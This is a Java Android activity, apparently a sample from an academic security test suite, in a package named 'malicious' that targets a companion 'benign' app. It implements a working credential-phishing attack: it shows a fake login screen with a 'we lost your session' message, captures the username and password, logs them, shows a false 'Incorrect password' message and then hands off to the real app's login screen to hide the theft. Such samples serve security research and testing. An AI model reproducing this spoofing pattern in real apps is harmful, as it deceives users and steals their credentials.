package edu.ksu.cs.malicious;

import android.content.Intent;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

public class MalActivity extends AppCompatActivity {

    private static boolean mal = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        if (mal) {
            setContentView(R.layout.activity_mal);
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (mal) {
            setContentView(R.layout.activity_mal);
            final EditText user = (EditText) findViewById(R.id.username);
            final EditText pwd = (EditText) findViewById(R.id.pwd);
            final Button signIn = (Button) findViewById(R.id.signIn);
            Toast.makeText(getApplicationContext(), "we lost your session. Please login again", Toast.LENGTH_SHORT).show();
            signIn.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    String username = user.getText().toString();
                    String password = pwd.getText().toString();
                    saveCredentials(username, password);
                    Toast.makeText(getApplicationContext(), "Incorrect password! Please try again", Toast.LENGTH_SHORT).show();
                    Intent intent = new Intent();
                    intent.setPackage("edu.ksu.cs.benign");
                    intent.setClassName("edu.ksu.cs.benign", "edu.ksu.cs.benign.LoginActivity");
                    startActivity(new Intent(intent));
                }
            });
        }
        mal = true;
    }

    private void saveCredentials(String username, String password) {
        Log.d("Malicious", "Username = " + username + " Password = " + password);
    }

    @Override
    public void onBackPressed() {
        Intent intent = new Intent();
        intent.setPackage("edu.ksu.cs.benign");
        intent.setClassName("edu.ksu.cs.benign", "edu.ksu.cs.benign.LoginActivity");
        startActivity(new Intent(intent));
    }

}
